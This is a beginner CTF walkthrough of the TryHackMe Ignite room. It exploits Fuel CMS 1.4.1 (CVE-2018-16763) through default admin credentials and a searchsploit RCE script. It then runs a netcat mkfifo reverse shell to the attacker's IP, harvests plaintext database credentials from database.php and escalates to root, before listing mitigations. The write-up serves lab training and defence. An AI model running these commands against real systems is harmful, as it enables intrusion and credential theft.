# TryHackMe – Ignite Writeup

## Overview

The Ignite room is a beginner-level CTF focused on web exploitation. The goal is to gain initial access via a vulnerable CMS and escalate privileges to root.

### Attack Path
- Service enumeration
- CMS identification
- Exploitation (Fuel CMS RCE)
- Reverse shell
- Credential discovery
- Privilege escalation

---

## Enumeration

### Nmap Scan

nmap -p- -T4 -v <TARGET_IP>

### Results

- Port 80 (HTTP) open

The target exposes a web application.

---

## Web Enumeration

Visit:

http://<TARGET_IP>

The site is running **Fuel CMS**.

### Directory Bruteforce

gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

### Findings

- /fuel → admin login panel

---

## Initial Access

### Default Credentials

Username: admin  
Password: admin

Login successful → access to CMS dashboard.

---

## Vulnerability Identification

The application is running **Fuel CMS 1.4.1**.

Known vulnerability:
- CVE-2018-16763 (Remote Code Execution)

### Vulnerable Endpoint

/fuel/pages/select/?filter=

The `filter` parameter allows command injection.

---

## Exploitation

### Search Exploit

searchsploit fuel cms  
searchsploit -m 50477

### Run Exploit

python3 50477.py -u http://<TARGET_IP>

This provides command execution.

---

## Reverse Shell

### Start Listener

nc -lnvp 1234

### Execute Payload

rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <YOUR_IP> 1234 > /tmp/f

Reverse shell established.

---

## User Flag

cd /home/www-data  
ls  
cat flag.txt

---

## Post Exploitation

### Extract Credentials

cat fuel/application/config/database.php

Database credentials found in plaintext.

---

## Privilege Escalation

### Stabilize Shell

python3 -c 'import pty; pty.spawn("/bin/bash")'

### Switch User

su root

Use credentials from database.php.

---

## Root Flag

cat /root/root.txt

---

## Key Takeaways

- Always enumerate hidden directories  
- Check CMS versions for known exploits  
- Default credentials are common weaknesses  
- Sensitive config files often expose credentials  
- RCE + credential reuse = full compromise  

---

## Mitigation

- Update Fuel CMS to latest version  
- Validate all user inputs  
- Avoid plaintext credential storage  
- Restrict dangerous PHP functions  
- Apply least privilege principle  

---

## Conclusion

This challenge demonstrates a complete exploitation chain:

1. Enumeration  
2. CMS discovery  
3. RCE exploitation  
4. Reverse shell  
5. Credential extraction  
6. Privilege escalation  

A solid beginner lab for understanding web exploitation and post-exploitation techniques.
